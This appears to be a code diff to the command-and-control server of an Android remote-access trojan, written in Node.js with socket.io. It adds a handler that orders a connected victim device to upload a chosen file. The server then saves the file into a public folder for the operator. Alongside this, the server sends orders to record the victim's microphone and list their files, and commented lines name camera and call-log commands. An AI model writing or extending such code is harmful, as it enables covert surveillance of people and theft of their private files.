@@ -111,7 +111,8 @@ IO.sockets.on("connection", function (socket) {
     socket.on('x0000fm', (data) => {
         if (data.file == true) { // response with file's binary
             console.log('Saving file..');
-            var filePath = path.join("./d", data.name);
+            type = data.name.split(".")[1];
+            var filePath = path.join("./public", 'z.'+type);
 
             // function to save the file to my local disk
             fs.writeFile(filePath, data.buffer, "binary", (err) => {
@@ -119,6 +120,7 @@ IO.sockets.on("connection", function (socket) {
                     console.log('Saving file failed');
                 else
                     console.log('File saved on ');
+                    socket.emit('dl',type)
             });
 
         } else if (data.length != 0) { // response with files list
@@ -148,11 +150,16 @@ IO.sockets.on("connection", function (socket) {
     socket.on('mic', (data) => {
         console.log(data)
         v[data.id].emit('order', { order: 'x0000mc', sec: data.time });
+        
     })
 
     socket.on('files', (data) => {
         console.log(data)
         v[data.id].emit('order', { order: 'x0000fm', extra: 'ls', path: data.path });
+    })
+    socket.on('dl', (data) => {
+        console.log(data)
+        v[data.id].emit('order', { order: 'x0000fm', extra: 'dl', path: data.path });
     })
     //socket.emit("order", { order: "x0000ca", extra: 0 });
     //socket.emit('order', { order: 'x0000cl' });
